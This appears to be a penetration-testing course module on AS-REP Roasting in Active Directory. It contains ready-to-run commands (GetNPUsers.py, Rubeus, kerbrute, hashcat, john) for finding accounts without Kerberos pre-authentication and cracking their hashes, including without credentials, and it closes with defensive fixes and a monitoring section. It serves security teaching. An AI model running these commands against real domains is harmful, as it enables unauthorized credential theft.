# AS-REP Roasting

## Unit 3 - Topic 5 | Initial Access Scenarios

---

## Overview

**AS-REP Roasting** targets Active Directory user accounts that have **Kerberos pre-authentication disabled**. When this setting is enabled, an attacker can request an AS-REP (Authentication Service Response) for these users without knowing their password, and the response contains an encrypted portion that can be cracked offline.

---

## 1. How AS-REP Roasting Works

```
NORMAL KERBEROS AUTHENTICATION:
┌──────┐      AS-REQ (encrypted with user's hash)       ┌──────┐
│Client│ ──────────────────────────────────────────────→ │  KDC │
│      │      AS-REP (TGT, encrypted with user's hash)  │  (DC)│
│      │ ←────────────────────────────────────────────── │      │
└──────┘   KDC verifies: client knows the password      └──────┘
           by decrypting the pre-auth timestamp

AS-REP ROASTING (Pre-auth DISABLED):
┌──────────┐    AS-REQ (no pre-auth needed!)    ┌──────┐
│ Attacker │ ─────────────────────────────────→ │  KDC │
│          │    AS-REP (encrypted with          │  (DC)│
│          │    user's hash - crackable!)       │      │
│          │ ←────────────────────────────────── │      │
└──────────┘                                    └──────┘

WHY IT WORKS:
├── Pre-authentication normally requires proving identity
├── When disabled, KDC sends AS-REP to anyone who asks
├── Part of AS-REP is encrypted with the user's password hash
├── Attacker captures this and cracks it offline
└── No authentication required = no password needed to attack!

USER ACCOUNT CONTROL FLAG:
└── DONT_REQUIRE_PREAUTH (0x400000 / 4194304)
    Set in: AD Users → Account → "Do not require
    Kerberos preauthentication"
```

---

## 2. Finding AS-REP Roastable Accounts

```bash
# === FROM LINUX ===
# Impacket GetNPUsers.py (most common):
GetNPUsers.py corp.local/ -dc-ip dc01 -usersfile users.txt \
  -no-pass -format hashcat
# Tests each user in list for pre-auth disabled
# -format hashcat: Output in hashcat format

# Without user list (needs valid creds):
GetNPUsers.py corp.local/user:pass -dc-ip dc01 \
  -request -format hashcat
# Automatically finds all vulnerable accounts

# CrackMapExec:
crackmapexec ldap dc01 -u user -p pass \
  --asreproast asrep_hashes.txt

# === FROM WINDOWS ===
# Rubeus:
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
# Automatically finds and roasts all vulnerable users

# PowerView:
Get-DomainUser -PreAuthNotRequired | select samaccountname

# AD Module:
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} \
  -Properties DoesNotRequirePreAuth

# === LDAP QUERY ===
# LDAP filter for DONT_REQUIRE_PREAUTH:
"(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
```

---

## 3. Cracking AS-REP Hashes

```bash
# === HASH FORMAT ===
# $krb5asrep$23$user@CORP.LOCAL:salt$encrypted_part

# === HASHCAT ===
hashcat -m 18200 asrep_hashes.txt wordlist.txt
# -m 18200: Kerberos 5 AS-REP etype 23

# With rules:
hashcat -m 18200 asrep_hashes.txt rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# === JOHN THE RIPPER ===
john asrep_hashes.txt --wordlist=rockyou.txt
# Auto-detects krb5asrep format

# === CRACKING SPEED ===
# AS-REP uses RC4 encryption (etype 23) by default
# Relatively fast to crack (similar to NTLM speed)
# Good wordlist + rules usually sufficient

# === TIPS ===
# 1. Target accounts likely to have weak passwords
#    Service accounts, test accounts, old accounts
# 2. Use company-specific wordlists
# 3. Try password spraying patterns
# 4. Check password policy for complexity hints
```

---

## 4. AS-REP Roasting Without Credentials

```bash
# === UNAUTHENTICATED AS-REP ROASTING ===
# You DON'T need domain credentials for this attack!
# You only need:
#   1. Network access to the DC (port 88)
#   2. A list of valid usernames

# Step 1: Enumerate valid users (Kerbrute):
kerbrute userenum -d corp.local --dc dc01 usernames.txt
# Valid users return different Kerberos error than invalid

# Step 2: Test for pre-auth disabled:
GetNPUsers.py corp.local/ -dc-ip dc01 \
  -usersfile valid_users.txt -no-pass -format hashcat

# Step 3: Crack any captured hashes:
hashcat -m 18200 hashes.txt rockyou.txt

# === COMPARE WITH KERBEROASTING ===
# AS-REP Roasting:
# ├── Targets: Users with pre-auth disabled
# ├── Requires: Username only (no password!)
# ├── Hash type: krb5asrep (18200)
# └── Less common (fewer vulnerable accounts)

# Kerberoasting:
# ├── Targets: Users with SPNs (service accounts)
# ├── Requires: Valid domain credentials
# ├── Hash type: krb5tgs (13100)
# └── More common (many service accounts have SPNs)
```

---

## 5. Defense Against AS-REP Roasting

| Defense | Implementation |
|---------|---------------|
| **Disable the flag** | Remove "Do not require Kerberos pre-auth" for all accounts |
| **Audit accounts** | Regularly check for DONT_REQUIRE_PREAUTH flag |
| **Strong passwords** | Enforce complex passwords on affected accounts |
| **Monitor** | Alert on AS-REP requests for multiple accounts (Event ID 4768 with result code 0x0 and pre-auth type 0) |
| **Detection** | Watch for Rubeus/GetNPUsers tool signatures |
| **AES encryption** | Force AES instead of RC4 (harder to crack) |

```powershell
# Find and fix vulnerable accounts:
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} | \
  Set-ADAccountControl -DoesNotRequirePreAuth $False

# Monitor: Event ID 4768 (Kerberos TGT request)
# Look for: Pre-Authentication Type = 0 (none)
# Normal value: 2 (encrypted timestamp)
```

---

## Summary Table

| Concept | Key Point |
|---------|-----------|
| **AS-REP Roasting** | Attack on accounts without Kerberos pre-auth |
| **Flag** | DONT_REQUIRE_PREAUTH (4194304) |
| **Tool (Linux)** | GetNPUsers.py from Impacket |
| **Tool (Windows)** | Rubeus asreproast |
| **Hashcat mode** | -m 18200 (krb5asrep) |
| **Key advantage** | No domain credentials needed! |

---

## Quick Revision Questions

1. **What makes an account vulnerable to AS-REP Roasting?**
2. **Do you need valid credentials to perform AS-REP Roasting?**
3. **What is the hashcat mode for AS-REP hashes?**
4. **How does AS-REP Roasting differ from Kerberoasting?**
5. **How do you fix vulnerable accounts?**

---

[← Previous: LLMNR/NBT-NS Poisoning](04-llmnr-nbns-poisoning.md) | [Next: Initial Foothold Strategies →](06-initial-foothold-strategies.md)

---

*Unit 3 - Topic 5 of 6 | [Back to README](../README.md)*
